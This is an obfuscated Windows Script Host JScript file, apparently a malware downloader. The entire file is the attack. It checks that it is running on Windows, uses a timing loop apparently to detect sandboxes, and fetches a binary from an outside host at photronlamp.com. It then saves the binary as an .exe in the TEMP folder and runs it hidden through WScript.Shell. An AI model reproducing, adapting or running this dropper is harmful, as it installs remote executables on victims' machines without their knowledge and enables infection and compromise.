var _SF = false;
var _GJ = "CreateObject";
var _HY = function _EX() {return WScript[_GJ]("WScript"+".Shell");}(), _PT = 11;
var _LC = "MSXML2.XMLHTTP";
var _U = 2123213;
var _YP = 0;
function _M(_ME){_HY["Run"](_ME, _YP, _YP);};
function _BR(){return _LC + "";};
function _OL(_HB, _V){_YP = _YP * 1; return _HB - _V;};
function _K(){return _GJ;};
/*@cc_on
  @if (@_win32 || @_win64)
    _SF = true;
  @end
@*/
if (_SF)
{
var _Y = "";
function _R(){return 22;};
var _CM = 0; var _EE = 0;
function _L()
{
var _SA = new this["Date"]();
var _PB = _SA["getUTCMilliseconds"]();
WScript["Sleep"](_R());
var _SA = new this["Date"]();
var _DF = _SA["getUTCMilliseconds"]();
WScript["Sleep"](_R());
var _SA = new this["Date"]();
var _OZ = _SA["getUTCMilliseconds"]();
var _CM = "_XK";
_CM = _OL(_DF, _PB);
var _EE = "_TJ";
_EE = _OL(_OZ, _DF);
_Y = "open";
return _OL(_CM, _EE);
}
var _O = false;
var _W = false;
for (var _KJ = _YP; _KJ < _R() * 1; _KJ++){if (_L() != _YP){
_O = true; 
_EE = "31" + 11 * _CM + _EE; 
_W = true; 
break;
}}
function _IU() {return ((_O == true) && (_O == _W)) ? 1 : _YP;};
if (_O && _IU() && _W){
function _DA() {return _HY["ExpandEnvironmentStrings"]("%TE"+"MP%/") + "tptcMDGV55CK.ex" + "e";};
 _YX = _BR();
 _B = WScript[_GJ](_YX);
 var _X = 1;
 while (_X){
try {
	if (_X == 1)
	{
		_B[_Y]("GET", "http://photronlamp.com/m39ska", false);
		_B["send"]();
		_Z = "Sleep";
	}
	WScript[_Z](_R() + 120); 
	if (_B["readystate"] < 2 * 2) continue;
	_X = _YP;
	function _GY(_RT) {var _N = (1, 2, 3, 4, 5, _RT); return _N;};
	_XT = WScript[_K()]("ADODB.Stream");
	_YX = _XT;
	_YX[_Y]();
	_YX["type"] = _GY(1);
	_YX["write"](_B["ResponseBody"]);
	_XT["position"] = _GY(_YP);
	_YX["Save" + "ToFile"](_DA(), 2);
	_XT["cl"+"ose"]();
	_IN = _DA();
	_M(_IN);
} catch(_NK){};
}
}
}

